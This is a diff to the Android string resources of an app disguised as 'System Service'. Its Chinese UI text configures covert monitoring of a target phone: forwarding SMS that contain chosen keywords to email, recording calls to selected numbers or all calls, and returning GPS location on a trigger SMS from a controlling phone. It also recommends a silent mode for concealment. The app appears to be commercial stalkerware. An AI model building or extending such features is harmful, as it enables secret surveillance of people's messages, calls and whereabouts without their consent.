@@ -1,7 +1,9 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
     <string name="app_name">System Service</string>
+    <string name="info">提示</string>
     <string name="warning">警告</string>
+    <string name="error">错误</string>
     
     <!-- SMS -->
     <string name="sms_received">收信</string>
@@ -64,6 +66,7 @@
     <string name="pref_use_self_sender_summary">如果您有自己的GMail邮箱，用它发信更有利于保护您的隐私，否则将使用系统内置邮箱发信。</string>
     <string name="pref_sender_mail_title">发信邮箱（仅限GMail）</string>
     <string name="pref_sender_pwd_title">发信邮箱密码</string>
+    <string name="pref_invalid_sender_mail">警告：%s 不是一个有效的GMail邮箱地址。</string>
     <string name="pref_recv_mail_title">收信邮箱</string>
     <string name="pref_invalid_mail_format">警告：%s 不是一个有效的邮箱地址。</string>
     <string name="pref_pls_input_pwd">请输入邮箱密码。</string> 
@@ -74,8 +77,10 @@
     <string name="pref_record_number_title">录音目标号码段</string>
     <string name="pref_pls_input_target_number">请输入至少一个目标号码段（至少4位数字）</string>
     <string name="pref_record_number_summary">仅当对方号码包含以下号码（至少4位数字）时才录音。最多支持9个号码段，用空格隔开。</string>
+    <string name="pref_target_num_count_reach_max">最多支持9个号码段，用空格隔开。</string>
+    <string name="pref_target_num_format_error">错误：每个号码段至少为4位数字。</string>
     <string name="pref_recv_phonenum_title">主控手机号码</string>
-    <string name="pref_pls_input_phonenum">请输入主控手机号。</string>
+    <string name="pref_pls_input_valid_recv_phonenum">错误：%s不是有效的手机号码。</string>
     <string name="pref_sensitive_words_title">敏感词（空格隔开）</string>
     <string name="pref_sensitive_words_summary">请用空格隔开每个敏感词，最多支持9个。</string>
     <string name="pref_pls_input_sensitive_words">请输入敏感词，并用空格隔开，最多支持9个。</string>
@@ -84,8 +89,6 @@
     <string name="pref_gps_word_summary">发送包含有该词或短句的短信到目标手机可获知其GPS位置（仅从主控手机上发送短信有效）。</string>
     <string name="pref_pls_input_gps_activate_word">请输入一个特殊词或短句作为GPS激活词（比如：你在哪儿）。</string>
     <string name="pref_gps_activate_word_max_len">最大长度不能超过12个汉字或24个英数字符。</string>
-    <string name="pref_show_sms">显示短信</string>
-    <string name="pref_show_sms_summary">是否显示包含激活词的短信</string>
     <string name="pref_category_network_mode_title">网络连接</string>
     <string name="pref_network_mode_title">网络连接模式</string>
     <string name="pref_network_mode_summary">建议使用默认的静默模式更有利于隐蔽性。</string>
@@ -122,7 +125,7 @@
     
     <!-- Indication -->
     <string name="indication_register_ok">注册成功。</string>
-    <string name="indication_register_ng">注册失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_register_ng">注册失败。请检查您发送的注册码是否正确。若无法解决请联系客服。</string>
     <string name="indication_unregister_ok">卸载成功。</string>
     <string name="indication_unregister_ng">卸载失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
     <string name="indication_set_selfsender_ok">设置送信邮箱成功。</string>
@@ -137,10 +140,15 @@
     <string name="indication_set_getinfo_interval_ng">设置信息收集周期失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
     <string name="indication_set_targetnum_ok">设置监听录音目标号码段成功。</string>
     <string name="indication_set_targetnum_ng">设置监听录音目标号码段失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_set_targetall_ok">设置对所有电话录音成功。</string>
+    <string name="indication_set_targetall_ng">必须使用自己的发信邮箱，才能对所有电话录音。请使用#1#指令设置你的专有发信邮箱（目前仅支持GMail）。若无法解决请联系客服。</string>
     <string name="indication_set_network_mode_ok">设置网络连接模式成功。</string>
     <string name="indication_set_network_mode_ng">设置网络连接模式失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
     <string name="indication_set_sens_words_ok">设置敏感词成功。</string>
     <string name="indication_set_sens_words_ng">设置敏感词失败。请检查您发送的指令格式是否正确，及敏感词个数是否超过最大数（9个）。若无法解决请联系客服。</string>
     <string name="indication_disable_sens_words_ok">取消短信转发成功。</string>
+    <string name="indication_disable_sens_words_ng">取消短信转发失败。</string>
+    <string name="indication_set_location_word_ok">设置定位短语成功。</string>
+    <string name="indication_set_location_word_ng">设置定位短语失败。</string>
     
 </resources>
